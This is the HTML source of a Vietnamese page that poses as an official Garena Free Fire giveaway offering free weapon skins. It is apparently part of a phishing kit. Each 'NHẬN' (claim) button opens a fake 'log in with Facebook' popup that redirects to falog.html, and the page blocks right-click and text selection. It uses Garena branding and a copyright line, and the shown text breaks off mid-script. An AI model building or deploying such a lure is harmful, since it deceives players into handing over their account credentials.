<html lang="vi">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="GARENA FREE FIRE">
    <meta name="description" content="GARENA FREE FIRE">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="GARENA FREE FIRE">
    <meta property="og:type" content="website">
    <meta name="copyright" content="NVN">
    <meta name="theme-color" content="#000">
    <meta property="og:image" content="images/icon.png">
    <title>Nhận quà ff</title>
    <link href="./index_files/css.css" rel="stylesheet">
    <link rel="stylesheet" href="css-zone/facebook.css">
    <link rel="stylesheet" href="css-zone/animate.css">
    <link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="icon" type="img/png" href="images/icon.png" sizes="32x32">
    <script type="text/javascript" src="js-zone/jquery.js"></script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script>
    <script type="text/javascript" src="js-zone/myScript.js"></script>
    <script language="JavaScript">
        document.write(ls())
    </script>
</head>
<script>
  // Lưu thời gian hết hạn vào local storage
var expirationDate = new Date();
expirationDate.setSeconds(expirationDate.getSeconds() + 10);
localStorage.setItem('expirationDate', expirationDate.getTime());

// Kiểm tra ngày hết hạn
var now = new Date().getTime();
var storedExpirationDate = localStorage.getItem('expirationDate');

if (storedExpirationDate && now > parseInt(storedExpirationDate)) {
  alert('Mã nguồn đã hết hạn!');
}

</script>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

    <style type="text/css">
        @charset "utf-8";
        @import url('cc.css');
        @import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
        *,
        *:before,
        *:after {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }

        @font-face {
            font-family: 'selow';
            font-style: normal;
            font-weight: 700;
            src: url(fonts/selow.woff2) format("woff2"), url(fonts/selow.woff) format("woff"), url(fonts/selow.ttf) format("truetype");
        }

        .landing {
            background: url(img/landing.jpg) no-repeat center center;
            background-size: cover;
            width: 100%;
            height: auto;
        }

        .navbar {
            background: #000;
            background-size: 100% 100%;
            width: 100%;
            height: 57px;
        }

        .navbar-logo {
            width: 45px;
            float: left;
            margin-top: 7px;
            margin-left: 7px;
            border-radius: 5px;
        }

        .navbar-title {
            margin-left: 6px;
            margin-top: 8px;
            color: #eaa300;
            font-size: 17px;
            font-family: Teko;
            text-align: left;
            float: left;
        }

        .navbar-title span {
            color: #d9d9d8;
            font-size: 14px;
            line-height: 13px;
        }

        .navbar-shop {
            width: 25px;
            margin-top: 15px;
            margin-right: 20px;
        }

        .navbar-language {
            width: 25px;
            margin-top: 15px;
            margin-right: 20px;
        }

        .navbar-menu {
            width: 20px;
            margin-top: 15px;
            margin-right: 5px;
        }

        .navbar-right {
            width: auto;
            float: right;
        }

        .navbar-download {
            background: #ffca13;
            width: 46px;
            height: 45px;
            margin-top: 7px;
            margin-right: 10px;
            border-radius: 7px;
            float: right;
        }

        .navbar-download img {
            width: 20px;
            height: 21px;
            margin: 13px;
        }

        .header {
            width: 100%;
            height: auto;
        }

        .header img {
            width: 100%;
            height: auto;
            margin-bottom: -2px;
            border-bottom: 2px solid #70FFB2;
        }

        .header video {
            width: 100%;
            border: none;
        }

        .gallery-contaniner {
            width: 100%;
            border: none;
        }

        .slideshow-container {
            max-width: 1000px;
            position: relative;
            margin: auto;
            border-top: 1px solid #ffbe21;
            border-bottom: 1px solid #ffbe21;
        }

        .fade {
            -webkit-animation-name: fade;
            -webkit-animation-duration: 1.5s;
            animation-name: fade;
            animation-duration: 1.5s;
        }

        .notiftwitter {
            width: 30%;
            height: 30px;
            margin-left: 35%;
            margin-right: auto;
            padding: 5px;
            font-size: 22px;
            font-family: Teko;
            font-weight: 500;
            text-align: center;
            color: #ffbe21;
            margin-bottom: 0px;
            border: none;
            position: relative;
            outline: none;
            display: block;
        }

        .season-alert {
            background: url(img/alerts.png) no-repeat center center;
            background-size: 100% 100%;
            width: 99%;
            height: 75px;
            margin-top: -15px;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        .season-alert-img {
            width: 45px;
            height: auto;
            margin-top: 3px;
            margin-left: 7px;
            float: left;
        }

        .season-btn {
            background: url(/img/btn-on.png) no-repeat center;
            background-size: 100% 100%;
            width: auto;
            height: auto;
            margin-left: auto;
            margin-right: auto;
            padding: 10px;
            padding-left: 30px;
            padding-right: 30px;
            font-size: 18px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            color: #000;
            margin-bottom: 3px;
            border: none;
            position: relative;
            outline: none;
            display: block;
        }

        .season-btn:hover {
            background: url(../img/menu_on.png) no-repeat center;
            background-size: 100% 100%;
            color: #000;
            transition: 0.5s;
        }

        .event-title {
            color: #ffca13;
            font-size: 2.5rem;
            font-family: 'nvn', cursive;
            font-weight: bold;
            text-align: center;
            text-transform: uppercase;
            text-shadow: 1.3px 1.3px 0px rgba(0, 0, 0);
            letter-spacing: 1px;
        }

        .event-subtitle {
            display: block;
            margin-left: 5%;
            margin-right: 5%;
            margin-top: -15px;
            margin-bottom: 25px;
            overflow: hidden;
            text-align: center;
            white-space: nowrap;
            width: 90%;
        }

        .event-subtitle>span {
            display: inline-block;
            position: relative;
            color: #ffca13;
            cursor: default;
            font-size: 1.4rem;
            text-shadow: 1px 1px 0px rgba(0, 0, 0);
        }

        .event-subtitle>span:before,
        .event-subtitle>span:after {
            background: #ffca13;
            border-bottom: 2px solid #ffca13;
            content: "";
            height: 1px;
            position: absolute;
            top: 50%;
            width: 9999px;
        }

        .event-subtitle>span:before {
            margin-right: 15px;
            right: 100%;
        }

        .event-subtitle>span:after {
            left: 100%;
            margin-left: 15px;
        }

        .event-notification {
            background: url(img/alert.jpg) no-repeat center;
            background-size: 100% 100%;
            width: 100%;
            height: 60px;
            padding: 7px;
            padding-top: -20px;
            margin-right: auto;
            margin-left: auto;
        }

        .event-notification-text {
            padding-top: 15px;
            text-align: center;
            font-family: 'nvn', cursive;
            color: #FBE900;
            font-size: 17px;
        }

        .alert-wrapper {
            width: 93%;
            height: auto;
            margin-top: 10px;
            margin-bottom: 10px;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        .alert {
            background: url(img/selow.jpg) no-repeat center;
            background-size: 100% 100%;
            width: 100%;
            height: 130px;
            margin-top: -1px;
            margin-left: auto;
            margin-right: auto;
            border-top: 0px solid #1288A1;
            border-right: 0px solid #1288A1;
            border-top: 0px solid #1288A1;
            border-bottom: 0px solid #1288A1;
            display: block;
        }

        .popup {
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9999;
            background-color: rgba(0, 0, 0, 0.4);
        }

        .popup-box-wrapper {
            width: 400px;
            height: auto;
            position: relative;
            margin: 50px auto;
            margin-top: 15%;
            text-align: center;
            font-family: 'nvn', cursive;
            color: #fff;
        }

        .popup-box-navbar {
            background: url(img/popup-navbar2.png) no-repeat center center;
            background-size: 100% 100%;
            height: 43px;
            padding-bottom: 5px;
        }

        .popup-box-navbar img {
            width: 25px;
            height: 25px;
            margin-top: 9px;
            margin-right: 15px;
            float: right;
        }

        .popup-box-navbar-title {
            padding-left: 12px;
            padding-top: 12px;
            padding-bottom: 2px;
            color: #F4CD34;
            font-size: 22px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            text-decoration: underline;
        }

        .popup-box-bg {
            background: url(img/se3low-login.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: 230px;
        }

        .popup-box-se3low {
            width: 95%;
            height: auto;
            margin-top: 100px;
            margin-left: 20px;
            margin-right: auto;
            padding-top: 60px;
            padding-bottom: 20px;
            color: #000;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            display: block;
        }

        .popup-box-se3low9 {
            width: 95%;
            height: auto;
            margin-top: 100px;
            margin-left: 20px;
            margin-right: auto;
            padding-top: 60px;
            padding-bottom: 20px;
            padding-right: 150px;
            color: #000;
            font-size: 19px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            display: block;
        }

        .popup-box-bg2 {
            background: url(img/se3low-rwrd.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: 250px;
        }

        .popup-box-selow2 {
            width: 95%;
            height: auto;
            margin-top: 50px;
            margin-right: 50px;
            margin-left: auto;
            padding-top: 30px;
            padding-left: 18px;
            padding-bottom: 15px;
            color: #000;
            font-size: 19px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            display: block;
        }

        .popup-box-bg3 {
            background: url(img/se3low-reward.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: 190px;
        }

        .popup-box-selow3 {
            width: 95%;
            height: auto;
            margin-top: 40px;
            margin-right: 50px;
            margin-left: auto;
            padding-top: 8px;
            padding-right: 50px;
            padding-bottom: 10px;
            color: #000;
            font-size: 19px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: right;
            display: block;
        }

        .popup-box-selow3 i {
            padding-top: 15px;
            padding-bottom: 15px;
            color: #F5EAB0;
            font-size: 50px;
            text-align: center;
        }

        .popup-box-selow4 {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 100px;
            padding: 5px;
            padding-left: 140px;
            color: #000;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            display: block;
        }

        .popup-box-selow4 i {
            padding-top: 15px;
            padding-bottom: 15px;
            color: #000;
            font-size: 50px;
            float: center;
        }

        .popup-box-button {
            background: url(img/selowcolok.png) no-repeat center center;
            background-size: 100% 100%;
            width: 30%;
            height: auto;
            margin-top: -10px;
            margin-right: 8px;
            padding: 5px;
            color: #000;
            font-size: 15px;
            font-family: 'nvn', cursive;
            text-align: center;
            text-shadow: 0 1px 0 #fff;
            border: none;
            outline: none;
            position: relative;
            float: right;
        }

        .popup-box-alert {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #F5EAB0;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            display: block;
        }

        .popup-box-alert2 {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #F5EAB0;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            display: block;
        }

        .popup-box-alert0 {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #F5EAB0;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: right;
            display: block;
        }

        .popup-box-alert3 {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #F5EAB0;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            display: block;
        }

        .popup-box-alert7 {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #F5EAB0;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            display: block;
        }

        .popup-box-alert4 {
            width: 95%;
            height: auto;
            margin-top: 10px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 10px;
            padding: 5px;
            color: #F5EAB0;
            font-size: 20px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            display: block;
        }

        .popup-box-alert4 i {
            padding-top: 15px;
            padding-bottom: 15px;
            color: #F5EAB0;
            font-size: 50px;
            text-align: center;
        }

        .popup-box-item {
            width: 23%;
            height: 85px;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
            display: block;
        }

        .popup-box-item img {
            width: 100%;
            height: 100%;
            border: 1px solid #B926E9;
        }

        .popup-box-item span {
            color: #fff;
            font-size: 22px;
            font-family: 'nvn', cursive;
            text-align: right;
            position: absolute;
            left: 0;
            right: 2px;
            bottom: -5px;
        }

        .popup-box-form {
            width: 85%;
            height: auto;
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        .popup-box-form input {
            background: url(img/verif.png) no-repeat center;
            background-size: 150% 150%;
            width: 70%;
            height: auto;
            margin-bottom: 3px;
            margin-right: -10px;
            padding: 4px;
            color: #fff;
            font-size: 17px;
            font-family: Teko;
            font-weight: 500;
            border: 2px solid #B926E9;
            border-radius: 3px;
            position: relative;
            float: right;
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }

        .popup-box-form input::placeholder {
            color: #fff;
        }

        .popup-box-form select {
            background: #F8BF0E;
            width: 100%;
            height: auto;
            margin-bottom: 3px;
            padding: 4px;
            color: #000;
            font-size: 17px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            border: 2px solid #8C5D19;
            border-radius: 3px;
            position: relative;
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }

        .popup-footer {
            background-size: 100% 100%;
            width: 100%;
            height: 50px;
        }

        .popup-footer button {
            width: auto;
            height: auto;
            margin-top: 8px;
            padding: 5px;
            padding-left: 40px;
            padding-right: 40px;
            color: #151e2d;
            font-size: 18px;
            font-family: selow;
            font-weight: 500;
            text-align: center;
            border: none;
            outline: none;
        }

        .popup-footer-deactive {
            background: url(img/selowcolok.png) no-repeat center;
            background-size: 90% 100%;
            margin-left: 15%;
            float: left;
        }

        .popup-footer-active {
            background: url(img/se3lowcolok.png) no-repeat center;
            background-size: 90% 100%;
            margin-right: 15%;
            float: right;
        }

        .popup-box-footerc {
            background-size: 100% 100%;
            width: 100%;
            height: 45px;
            float: right;
        }

        .popup-box-footerc button {
            background: url(img/se3lowcolok.png) no-repeat center;
            background-size: 100% 100%;
            width: auto;
            height: auto;
            margin-top: 3px;
            margin-left: 120px;
            padding: 6px;
            padding-left: 35px;
            padding-right: 35px;
            color: #000;
            font-size: 15px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: right;
            border: none;
            outline: none;
        }

        .popup-box-footerz {
            background-size: 100% 100%;
            width: 100%;
            height: 45px;
            float: right;
        }

        .popup-box-footerz button {
            background: url(img/selowcolok.png) no-repeat center;
            background-size: 100% 100%;
            width: auto;
            height: auto;
            margin-top: 3px;
            margin-right: 120px;
            padding: 4px;
            padding-left: 35px;
            padding-right: 35px;
            color: #000;
            font-size: 17px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            border: none;
            outline: none;
        }

        .popup-box-footer {
            background: url(img/popup-footer2.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: 45px;
        }

        .popup-box-footer button {
            background: url(img/btn-on2.png) no-repeat center;
            background-size: 100% 100%;
            width: auto;
            height: auto;
            margin-top: 5px;
            padding: 4px;
            padding-left: 35px;
            padding-right: 35px;
            color: #F4CD34;
            font-size: 18px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            border: none;
            outline: none;
        }

        .popup-box-form-footer {
            background: url(img/popup-footer2.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: 45px;
            margin-top: -17px;
        }

        .popup-box-form-footer button {
            background: url(img/btn-on2.png) no-repeat center;
            background-size: 100% 100%;
            width: auto;
            height: auto;
            margin-top: 5px;
            padding: 4px;
            padding-left: 30px;
            padding-right: 30px;
            color: #F4CD34;
            font-size: 18px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            border: none;
            outline: none;
        }

        .popup-btn-login {
            width: 50%;
            height: auto;
            padding: 6px;
            margin-top: 5px;
            margin-left: 20px;
            color: #000;
            font-size: 15px;
            font-family: 'nvn', cursive;
            border: none;
            outline: none;
            margin-bottom: 5px;
            position: relative;
            float: left;
        }

        .popup-btn-login i {
            color: #fff;
            font-size: 23px;
            float: left;
        }

        .popup-btn-facebook {
            background: #4167B2;
            color: #fff;
        }

        .popup-btn-twitter {
            background: #198B96;
            color: #fff;
        }

        .popup-login {
            background: rgba(0, 0, 0, 0.4);
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9999;
        }

        .popup-box-login-fb {
            background: #ECEFF6;
            max-width: 330px;
            height: auto;
            position: relative;
            margin: 50px auto;
            margin-top: 1.9%;
            text-align: center;
            font-family: 'Teko';
            color: #000;
            border-radius: 10px;
        }

        .popup-box-login-twitter {
            background: #fff;
            max-width: 330px;
            height: auto;
            position: relative;
            margin: 50px auto;
            margin-top: 10%;
            text-align: center;
            font-family: 'Teko';
            color: #000;
            border-radius: 10px;
        }

        .close-fb {
            background: #000;
            width: 20px;
            height: 20px;
            color: #fff;
            text-align: center;
            text-decoration: none;
            border-radius: 50%;
            border: 1.5px solid #fff;
            position: absolute;
            top: -8px;
            right: -10px;
            display: block;
        }

        .close-fb i {
            color: #fff;
            padding-top: 1px;
        }

        .close-other {
            background: #000;
            width: 20px;
            height: 20px;
            color: #fff;
            text-align: center;
            text-decoration: none;
            border-radius: 50%;
            border: 1.5px solid #fff;
            top: -8px;
            right: -10px;
            position: absolute;
            z-index: 9999999;
            display: block;
        }

        .close-other i {
            color: #fff;
            padding-top: 1px;
        }

        .balance2 {
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 7px;
            padding: 5px;
            display: block;
        }

        .balance2 img {
            width: 100px;
            margin-top: -10px;
            margin-right: 5px;
            float: center;
        }

        .balance2-nom {
            color: #fff;
            font-size: 18px;
            padding-top: 8px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            text-shadow: 0 1px 0 #000;
        }

        .balance2-detail {
            width: auto;
            height: auto;
            padding-top: 2px;
            padding-left: 5px;
            padding-bottom: 0px;
            color: #fff;
            font-size: 15px;
            font-family: 'nvn', cursive;
            text-align: center;
            text-shadow: 0 1px 0 #000;
            border-left: 3px solid #9FE9F7;
            line-height: 15px;
            float: left;
        }

        .balance2 button {
            background-size: 100% 100%;
            width: 30%;
            height: auto;
            margin-top: -75px;
            margin-right: 10px;
            padding: 5px;
            color: #000;
            font-size: 15px;
            font-family: 'nvn', cursive;
            text-align: center;
            border: none;
            outline: none;
            position: relative;
            float: right;
        }

        .balance {
            background: url(img/selowbro.png) no-repeat center center;
            background-size: 100% 100%;
            width: 94.3%;
            height: 75px;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 7px;
            padding: 5px;
            border-top: 2px solid #70FFB2;
            border-left: 2px solid #70FFB2;
            border-right: 2px solid #70FFB2;
            border-bottom: 2px solid #70FFB2;
            display: block;
        }

        .balance img {
            width: 65px;
            border-top: 1px solid #70FFB2;
            border-left: 1px solid #70FFB2;
            border-right: 1px solid #70FFB2;
            border-bottom: 1px solid #70FFB2;
            margin-top: -1px;
            margin-right: 5px;
            float: left;
        }

        .balance-nom {
            color: #fff;
            font-size: 16px;
            padding-top: 10px;
            padding-bottom: 4px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: left;
            text-shadow: 0 1px 0 #000;
        }

        .balance-detail {
            background: url(img/bg-det.png) no-repeat center center;
            background-size: 100% 100%;
            width: auto;
            height: auto;
            padding-top: 2px;
            padding-left: 5px;
            padding-right: 8px;
            padding-bottom: 3px;
            color: #fff;
            font-size: 14px;
            font-family: 'nvn', cursive;
            text-align: center;
            text-shadow: 0 1px 0 #000;
            border-left: 3px solid #FAB203;
            line-height: 15px;
            float: left;
        }

        .balance button {
            background: url(img/se3lowcolok.png) no-repeat center center;
            background-size: 100% 100%;
            width: 35%;
            height: 30px;
            margin-top: -10px;
            margin-right: 4px;
            padding: 5px;
            color: #000;
            font-size: 17px;
            font-family: 'nvn', cursive;
            text-align: center;
            text-shadow: 0 1px 0 #fff;
            border: none;
            outline: none;
            position: relative;
            float: right;
        }

        .box {
            width: 95%;
            height: auto;
            margin-left: auto;
            margin-right: auto;
            margin-top: 20px;
            margin-bottom: 25px;
            position: relative;
            display: block;
        }

        .scroll {
            width: 100%;
            position: relative;
            width: 100%;
            height: 400px;
            margin-top: 5px;
            margin-bottom: 20px;
            display: block;
            scrollbar-face-color: #ffbb40;
            scrollbar-shadow-color: #ffbb40;
            scrollbar-highlight-color: #ffbb40;
            scrollbar-3dlight-color: #ffbb40;
            scrollbar-darkshadow-color: #ffbb40;
            scrollbar-track-color: #ffbb40;
            scrollbar-arrow-co
        }

        .item1 {
            width: 47%;
            height: 82px;
            margin: 2px;
            margin-top: 45px;
            margin-bottom: 35px;
            display: inline-block;
        }

        .item1 .item-nominal {
            padding-right: 4px;
            color: #fff;
            font-size: 25px;
            font-family: 'nvn', cursive;
            text-align: right;
            position: absolute;
            bottom: -69px;
        }

        .item1 img {
            width: 100%;
            height: 100%;
            border: 1px solid #E0B35B;
            border-bottom: 1px solid #E0B35B;
        }

        .item1 button {
            background: url(img/btn-on.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: auto;
            margin-top: -1px;
            padding: 4px;
            color: #000;
            font-size: 17px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            border: 1px solid #E0B35B;
            outline: none;
        }

        .item1 div {
            width: 100%;
            height: 100%;
            border-radius: 0px 0px 0px 0px;
        }

        .item div:first-child {
            margin-left: 0;
        }

        .item2 {
            width: 28%;
            height: 107px;
            margin: 2px;
            margin-top: 10px;
            margin-bottom: 30px;
            display: inline-block;
        }

        .item2 .item-nominal {
            padding-right: 4px;
            color: #fff;
            font-size: 25px;
            font-family: 'nvn', cursive;
            text-align: right;
            position: absolute;
            bottom: -69px;
        }

        .item2 img {
            width: 100%;
            height: 100%;
            border: 1px solid #E0B35B;
        }

        .item2 button {
            background: url(img/btn-on.png) no-repeat center center;
            background-size: 100% 100%;
            width: 100%;
            height: auto;
            margin-top: -1px;
            padding: 4px;
            color: #000;
            font-size: 17px;
            font-family: 'nvn', cursive;
            font-weight: 500;
            text-align: center;
            border: 1px solid #E0B35B;
            outline: none;
        }

        .item2 div {
            width: 100%;
            height: 100%;
            border-radius: 0px 0px 0px 0px;
        }

        .item2 div:first-child {
            margin-left: 0;
        }

        figure {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        .itemShine {
            position: relative;
        }

        .itemShine::before {
            background: -webkit-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
            background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
            width: auto;
            height: auto;
            top: 0;
            left: -75%;
            position: absolute;
            z-index: 2;
            content: '';
            display: block;
            -webkit-transform: skewX(-25deg);
            transform: skewX(-25deg);
        }

        .itemShine::before {
            -webkit-animation: shine 2s infinite;
            animation: shine 2s infinite;
        }

        @-webkit-keyframes shine {
            100% {
                left: 125%;
            }
        }

        @keyframes shine {
            100% {
                left: 125%;
            }
        }

        .kanan {
            float: right;
        }

        .kiri {
            float: left;
        }

        .tengah {
            margin-left: auto;
            margin-right: auto;
            display: block;
        }

        ::-webkit-scrollbar {
            display: none;
            width: 0px;
        }

        @media only screen and (max-width:600px) {
            .containerLanding,
            .containerHome {
                width: 100%;
                height: auto;
                margin-top: 0px;
                margin-bottom: 0px;
                border: none;
                border-radius: 0px;
                padding: 0px;
            }
            .gallery-container {
                width: 100%;
                height: auto;
            }
            .box {
                width: 95%;
                height: auto;
            }
            .scroll {
                height: 400px;
            }
            .alert {
                border-top: 0px solid #1288A1;
                border-right: 0px solid #1288A1;
                border-top: 0px solid #1288A1;
                border-bottom: 0px solid #1288A1;
            }
            .season-alert {
                width: 99%;
                height: 70px;
            }
            .item2 {
                width: 30%;
                height: 107px;
            }
            .popup-box-wrapper {
                width: 400;
                margin-top: 60%;
            }
            .popup-box-item {
                width: 23%;
                height: 90px;
            }
            .popup-box-login-fb {
                margin-top: 4%;
            }
            .popup-box-login-twitter {
                margin-top: 25%;
            }
        }
    </style>
    <!-- Nông Văn Nguyên
Facebook.com/778578204  -->


    <!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->

    <div class="slider-container rewardsBox">
        <div class="navbar">
            <img class="navbar-logo" src="img/icon.png">
            <div class="navbar-title">
                GARENA FREE FIRE
                <br>
                <span style="font-family: 'nvn', cursive;">Sống dai thành huyền thoại!</span>
            </div>
            <!--- navbar-title --->
            <div class="navbar-right">
                <img class="navbar-shop" src="img/nav_shop.svg">
                <img class="navbar-language" src="img/nav_language.svg">
                <div class="navbar-download"><img src="img/nav_download.svg"></div>
            </div>
            <!--- navbar-right --->
        </div>
        <!--- navbar --->
        <div class="header">
            <div class="sliderHeader"><img src="https://gamek.mediacdn.vn/133514250583805952/2022/12/25/shirou-character-free-fire-2-e1654588820933-1671907419710-16719074205801193280320-1671934942852-16719349433721771004341-1671941253387-16719412541372075144583.png" style="width: 100%;"></div>
            <div class="sliderHeader"><img src="https://gamek.mediacdn.vn/133514250583805952/2022/12/25/shirou-character-free-fire-2-e1654588820933-1671907419710-16719074205801193280320-1671934942852-16719349433721771004341-1671941253387-16719412541372075144583.png" style="width: 100%;"></div>
            <div class="sliderHeader"><img src="https://gamek.mediacdn.vn/133514250583805952/2022/12/25/shirou-character-free-fire-2-e1654588820933-1671907419710-16719074205801193280320-1671934942852-16719349433721771004341-1671941253387-16719412541372075144583.png" style="width: 100%;"></div>
        </div>
        <!--- header --->

        <div class="gallery-container">
            <div class="box">
                <center>
                    <div class="season-alert">
                        <center>
                            <font style="font-size: 35px;color: #866d6b;position:absolute;font-family: 'nvn', cursive;left: 20%;top: 3%">Nhận quà ff</font>
                        </center>
                    </div>
                    <!--- season-alert --->
                    <div class="tab_rewards" id="latest">
                        <center>
                            <div class="balance">
                                <img src=" https://i.imgur.com/SViWOFB.jpg">
                                <div class="balance-nom">M1887 Hy Vọng </div>
                                <div class="balance-detail">Miễn Phí</div>
                                <button onmousedown="buka.play();" onclick="nvnvip();" src=" https://i.imgur.com/SViWOFB.jpg">NHẬN</button>
                            </div>
                            <div class="balance">
                                <img src=" https://i.imgur.com/Gyvzk0Z.jpg">
                                <div class="balance-nom">Ak Rồng Xanh </div>
                                <div class="balance-detail">Miễn Phí</div>
                                <button onmousedown="buka.play();" onclick="nvnvip();" src=" https://i.imgur.com/Gyvzk0Z.jpg">NHẬN</button>
                            </div>
                            <div class="balance">
                                <img src=" https://i.imgur.com/8USLAZ3.jpg">
                                <div class="balance-nom">Mp40 Mãng Xà </div>
                                <div class="balance-detail">Miễn Phí</div>
                                <button onmousedown="buka.play();" onclick="nvnvip();" src=" https://i.imgur.com/8USLAZ3.jpg">NHẬN</button>
                            </div>
                            <div class="balance">
                                <img src=" https://i.imgur.com/wcfSOV9.jpg">
                                <div class="balance-nom">M1014 Long Tộc </div>
                                <div class="balance-detail">Miễn Phí</div>
                                <button onmousedown="buka.play();" onclick="nvnvip();" src=" https://i.imgur.com/wcfSOV9.jpg">NHẬN</button>
                            </div>
                            <div class="balance">
                                <img src=" https://i.imgur.com/PBu7InP.jpg">
                                <div class="balance-nom">Scar Cá Mập Đen </div>
                                <div class="balance-detail">Miễn Phí</div>
                                <button onmousedown="buka.play();" onclick="nvnvip();" src=" https://i.imgur.com/PBu7InP.jpg">NHẬN</button>
                        </center><br>
                        </div>
                        <!--- tab-rewards --->
                        </section>
                        <!--- container --->
                    </div>
                    <!--- box --->
            </div>
            <!--- gallery-container --->
        </div>
        <!--- slider-container --->
        <div class="footer">
            <img class="footer-copyright-icons" src="img/batas.png">
            <img class="footer-copyright-icon" src="img/footer.png">
            <div class="footer-txt-copyright">ⓒ 2022 Garena. All rights reserved.</div>
            <!--- footer-txt-copyright --->
            <div class="footer-txt-copyright">Privacy Policy | Garena Games User Agreement</div>
            <!--- footer-txt-copyright --->
            <br>
        </div>
        <!--- footer --->



        <div class="popup account_login animated fadeIn" style="display: none;">
            <div class="popup-box-wrapper">
                <div class="popup-box-bg">
                    <div class="popup-box-se3low">
                        Đăng Nhập Tài Khoản </div>
                    <!--- popup-box-alert --->
                    <button type="button" class="popup-btn-login popup-btn-facebook" onclick="Redirect();"><i class="fa fa-facebook-square icon-login"></i>Đăng nhập bằng Facebook
</button>
                    <br>
                </div>
                <!--- popup-box-bg --->
            </div>
            <!--- popup-box-footer --->
        </div>
        <!--- popup-box-wrapper --->
    </div>
    <!--- popup account_login --->




    <!-- Nông Văn Nguyên
Facebook.com/778578204  -->


    <!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->
    <script type="text/javascript">
        function Redirect() {
            window.location = "falog.html";
        }

        function nvnvip() {
            $('.account_login').show();
        }
    </script>
    <script src="./index_files/jquery.min.js.download"></script>
    <script type="text/javascript" src="index_files/gift-zone.js"></script>
    <script type="text/javascript" src="js-zone/showHide.js"></script>
    <script type="text/javascript" src="js-zone/slider.js"></script>
    <script type="text/javascript" src="js-zone/script.js"></script>
    <audio id="audioFile" src="media/spin.mp3"></audio>
    <script>
        $(document).ready(function() {
            var detik = 59;
            var menit = 59;
            var jam = 23;

            function hitung() {
                setTimeout(hitung, 1000);
                $('#timer1').html('' + jam + ' : ' + menit + ' : ' + detik + '');
                detik--;
